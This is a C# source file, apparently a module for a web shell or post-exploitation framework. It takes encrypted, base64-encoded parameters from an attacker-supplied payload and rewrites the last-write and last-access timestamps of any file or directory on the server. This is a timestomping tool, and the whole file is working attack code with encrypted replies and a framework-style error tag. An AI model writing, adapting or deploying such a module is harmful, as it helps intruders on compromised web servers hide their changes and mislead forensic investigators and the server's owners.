using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;

public class file_touch
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            
            if (!dic.ContainsKey("z0") || !dic.ContainsKey("z1"))
            {
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes("0|Missing parameters."));
                return true;
            }

            string szPath = fnB64Decode(dic["z0"]);
            string szTimestamp = fnB64Decode(dic["z1"]);

            bool bIsFile = File.Exists(szPath);
            bool bIsDir = Directory.Exists(szPath);

            if (!bIsFile && !bIsDir)
            {
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes("0|File or Directory does not exist."));
                return true;
            }

            try
            {
                double timestamp = double.Parse(szTimestamp);
                DateTime targetTime = fnUnixTimestampToDateTime(timestamp);

                if (bIsFile)
                {
                    File.SetLastWriteTime(szPath, targetTime);
                    File.SetLastAccessTime(szPath, targetTime);
                }
                else
                {
                    Directory.SetLastWriteTime(szPath, targetTime);
                    Directory.SetLastAccessTime(szPath, targetTime);
                }

                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes("1|"));
            }
            catch (Exception exModify)
            {
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes("0|Failed to modify timestamps. Error: " + exModify.Message));
            }
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }

    public static DateTime fnUnixTimestampToDateTime(double unixTimestamp)
    {
        DateTime startTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
        
        return startTime.AddSeconds(unixTimestamp).ToLocalTime();
    }
}